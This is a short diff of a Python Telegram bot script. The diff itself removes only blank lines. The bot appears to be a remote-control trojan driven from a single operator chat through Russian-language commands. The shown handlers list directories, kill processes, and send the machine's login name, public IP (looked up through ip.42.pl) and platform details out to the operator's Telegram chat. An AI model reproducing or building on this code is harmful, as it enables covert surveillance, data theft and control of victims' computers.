@@ -15,11 +15,8 @@ bot_token = "your-token"
 adm = "your-chat-id"
 bot = telebot.TeleBot(bot_token)
 
-
-
 @bot.message_handler(commands=['start', 'help'])
 def start(message):
-	
 	send_mess = """
 	Выбирай:
 	/direct - директория
@@ -43,7 +40,6 @@ def start(message):
 	"""
 	bot.send_message(adm, send_mess, parse_mode='html')
 
-
 #директория
 @bot.message_handler(commands=['direct', 'Direct']) 
 def direct(command) :
@@ -63,7 +59,6 @@ def lsdir(commands):
 @bot.message_handler(commands=['check', 'Check']) 
 def send_info(command) :
     username = os.getlogin()
-    
     r = requests.get('http://ip.42.pl/raw')
     IP = r.text
     windows = platform.platform()
@@ -248,6 +243,5 @@ def taskkill(message):
   bot.send_message(adm, "Процесс " + user_msg.split(" ")[1] + " остановлен")
  except:
   bot.send_message(adm, 'Введите название процесса\n \n/Taskkill')
-
 
 bot.polling()
